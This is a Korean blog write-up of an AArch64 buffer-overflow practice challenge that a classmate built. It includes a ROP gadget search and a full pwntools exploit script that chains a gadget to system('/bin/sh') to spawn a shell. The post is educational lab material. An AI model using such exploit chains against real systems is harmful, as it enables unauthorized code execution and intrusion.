---
title: "[AArch64] Buffer OverFlow (실습)"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ aarch64 기법 공부 중 대학 동기가 문제를 하나 만들어주었다. [Exploitable]이라는 이름의 Buffer OverFlow 문제이다. symbol이 지워져있다.. (아 귀찮... 그래도 static은 안걸려있으니까...) main()으로 "
date: "2024-05-01"
translation_key: "tistory-e16623b654cb"
tags: ["STUDY/PWNABLE_AArch64"]
category: "STUDY/PWNABLE_AArch64"
source_url: "https://whrdud727.tistory.com/entry/AArch64-Buffer-OverFlow-%EC%8B%A4%EC%8A%B5"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※****

aarch64 기법 공부 중 대학 동기가 문제를 하나 만들어주었다.

\[Exploitable\]이라는 이름의 Buffer OverFlow 문제이다.

![](/assets/images/tistory/tistory-e16623b654cb/001.png)

symbol이 지워져있다.. (아 귀찮... 그래도 static은 안걸려있으니까...)

![](/assets/images/tistory/tistory-e16623b654cb/002.png)

main()으로 보이는 함수이다.

별다른 취약점은 보이지 않는다.

![](/assets/images/tistory/tistory-e16623b654cb/003.png)

호출되는 함수이다.

구조는 매우 단순하다. 앞서 다뤘던 예제처럼 main()이 아닌 호출되는 함수쪽에서 bof취약점이 발생한다.

하지만 바로 Shell을 얻거나 flag를 출력해주는 함수가 존재하지 않기 때문에 gadget들을 사용하여 chain을 구성해야 한다.

```
ROPgadget --binary Exploitable

#0x0000000000400724 : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
```

![](/assets/images/tistory/tistory-e16623b654cb/004.png)

맛있어 보이는 gadget이 존재한다.

system("/bin/sh");를 구현한다고 가정했을 때, 첫번째 인자값은 x0레지스터로 전달해야한다.

해당 gadget을 살펴보면 스택에 있는 값을 x0에 저장하는 과정이 있고 ldp 명령을 통해서 x29, x30을 덮어쓴다.

이때 x30이 ret에 해당하므로 구현하고자 하는 명령을 구현할 수 있다.

마침 해당 시나리오를 수행하라고 함수가 하나 만들어져 있다.

![](/assets/images/tistory/tistory-e16623b654cb/005.png)

해당 함수로부터 system()의 주소를 가져오고 /bin/sh문자열을 넣어주면 끝나는 문제이다.

```
from pwn import *

#p = process(['qemu-aarch64-static','./Exploitable'])
p = process(['qemu-aarch64-static','-g','1234','./Exploitable'])
e = ELF('./Exploitable')

#ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
gadget = 0x0000000000400724
system = 0x0000000000400590
binsh = 0x420040

payload = b'a'*0x28
payload += p64(gadget)
payload += b'a'*0x10
payload += p64(system)*2
payload += p64(0x0)
payload += p64(binsh)

p.sendlineafter(b'...', payload)

p.interactive()
```

위 방식대로 작성하면 shell을 얻을 수 있다.

[

Exploitable

0.06MB

](https://blog.kakaocdn.net/dna/bV6S14/btsG3tnmYfg/AAAAAAAAAAAAAAAAAAAAAI-s461KpxfspdkapSiGTS3atLDJ6NDOXd8oiTSqzxPr/Exploitable?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1790780399&allow_ip=&allow_referer=&signature=aLIIripn%2FRu39F%2BDa4zAWFcuGZc%3D&attach=1&knm=tfile.dat)

공유 허락을 받고 파일을 올려드립니다.
